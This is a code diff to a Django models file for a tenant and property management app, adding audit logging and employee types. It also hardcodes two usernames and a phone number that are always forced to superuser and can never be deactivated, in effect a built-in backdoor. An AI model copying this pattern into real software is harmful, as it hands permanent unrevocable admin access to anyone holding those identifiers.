@@ -2,6 +2,53 @@ from django.db import models
 from django.contrib.auth.models import AbstractUser
 import uuid
 
+# Учётные записи, которые нельзя отключить (is_active всегда True)
+PROTECTED_ADMIN_USERNAMES = frozenset({'nimdaSan', 'Bahi'})
+
+# Номера телефонов, которые всегда считаются администраторами (нормализованные: только цифры, 996...)
+ADMIN_PHONES = frozenset({'996700750606'})
+
+
+def _normalize_phone_for_admin(phone):
+    if not phone:
+        return None
+    digits = ''.join(c for c in str(phone).strip() if c.isdigit())
+    if len(digits) < 9:
+        return None
+    if len(digits) == 9 and digits.startswith('9'):
+        digits = '996' + digits
+    return digits[:12]
+
+
+def ensure_protected_admin(user):
+    """
+    Если пользователь — защищённый админ (логин nimdaSan/Bahi или телефон +996700750606),
+    принудительно выставляет role=admin, is_staff=True, is_superuser=True и возвращает True.
+    Иначе возвращает False.
+    """
+    if not user:
+        return False
+    if user.username in PROTECTED_ADMIN_USERNAMES:
+        changed = (user.role != 'admin' or not user.is_staff or not user.is_superuser)
+        user.role = 'admin'
+        user.is_staff = True
+        user.is_superuser = True
+        user.is_active = True
+        if changed:
+            user.save(update_fields=['role', 'is_staff', 'is_superuser', 'is_active'])
+        return True
+    norm = _normalize_phone_for_admin(user.phone)
+    if norm and norm in ADMIN_PHONES:
+        changed = (user.role != 'admin' or not user.is_staff or not user.is_superuser)
+        user.role = 'admin'
+        user.is_staff = True
+        user.is_superuser = True
+        user.is_active = True
+        if changed:
+            user.save(update_fields=['role', 'is_staff', 'is_superuser', 'is_active'])
+        return True
+    return False
+
 
 class User(AbstractUser):
     """Расширенная модель пользователя с ролями и RBAC"""
@@ -31,24 +78,43 @@ class User(AbstractUser):
         db_table = 'users'
         verbose_name = 'Пользователь'
         verbose_name_plural = 'Пользователи'
-    
+
+    def save(self, *args, **kwargs):
+        if self.username in PROTECTED_ADMIN_USERNAMES:
+            self.is_active = True
+            self.role = 'admin'
+            self.is_staff = True
+            self.is_superuser = True
+        elif _normalize_phone_for_admin(self.phone) in ADMIN_PHONES:
+            self.role = 'admin'
+            self.is_staff = True
+            self.is_superuser = True
+            self.is_active = True
+        super().save(*args, **kwargs)
+
     def __str__(self):
         return f"{self.username} ({self.get_role_display()})"
-    
+
     @property
     def counterparty_id(self):
         """Для совместимости с фронтендом"""
-        return self.counterparty_id if self.counterparty else None
+        return self.counterparty.id if self.counterparty else None
+
+
+# Типы контрагентов, которые считаются «сотрудниками» (управляются в Настройки → Сотрудники)
+EMPLOYEE_TYPES = frozenset({'admin', 'staff', 'master', 'accounting', 'sales'})
 
 
 class Tenant(models.Model):
-    """Контрагент"""
+    """Контрагент (в т.ч. сотрудники — типы из EMPLOYEE_TYPES управляются в Настройки → Сотрудники)"""
     TYPE_CHOICES = [
         ('admin', 'Администратор'),  # Суперадмин - не удалять!
         ('tenant', 'Арендатор'),
         ('landlord', 'Арендодатель'),
         ('staff', 'Сотрудник'),
         ('master', 'Мастер'),
+        ('accounting', 'Бухгалтерия'),
+        ('sales', 'Продажи'),
         ('company_owner', 'Владелец компании'),
         ('property_owner', 'Хозяин недвижимости'),
         ('investor', 'Инвестор'),
@@ -363,3 +429,42 @@ class LoginAttempt(models.Model):
         """Проверка истечения попытки"""
         from django.utils import timezone
         return timezone.now() > self.expires_at
+
+
+class AuditLog(models.Model):
+    """Лог изменений в настройках: кто, что, когда изменил; возможность восстановления."""
+    ACTION_CHOICES = [
+        ('profile_updated', 'Изменён профиль'),
+        ('password_changed', 'Сменён пароль'),
+        ('employee_created', 'Добавлен сотрудник'),
+        ('employee_updated', 'Изменён сотрудник'),
+        ('employee_deleted', 'Удалён сотрудник'),
+    ]
+    user = models.ForeignKey(
+        User,
+        on_delete=models.SET_NULL,
+        null=True,
+        related_name='audit_logs',
+        verbose_name='Кто изменил'
+    )
+    action = models.CharField(max_length=32, choices=ACTION_CHOICES, db_index=True, verbose_name='Действие')
+    target_model = models.CharField(max_length=32, db_index=True, verbose_name='Объект')  # profile, employee, password
+    target_id = models.CharField(max_length=64, blank=True, null=True, db_index=True, verbose_name='ID объекта')
+    target_repr = models.CharField(max_length=255, blank=True, verbose_name='Название объекта')
+    old_data = models.JSONField(default=dict, blank=True, verbose_name='Было (для восстановления)')
+    new_data = models.JSONField(default=dict, blank=True, verbose_name='Стало')
+    reason = models.CharField(max_length=255, blank=True, verbose_name='Причина/комментарий')
+    created_at = models.DateTimeField(auto_now_add=True, db_index=True, verbose_name='Когда')
+
+    class Meta:
+        db_table = 'audit_logs'
+        verbose_name = 'Запись лога'
+        verbose_name_plural = 'Логи изменений'
+        ordering = ['-created_at']
+        indexes = [
+            models.Index(fields=['target_model', 'created_at']),
+            models.Index(fields=['user', 'created_at']),
+        ]
+
+    def __str__(self):
+        return f"{self.get_action_display()} — {self.target_repr or self.target_id} ({self.created_at})"
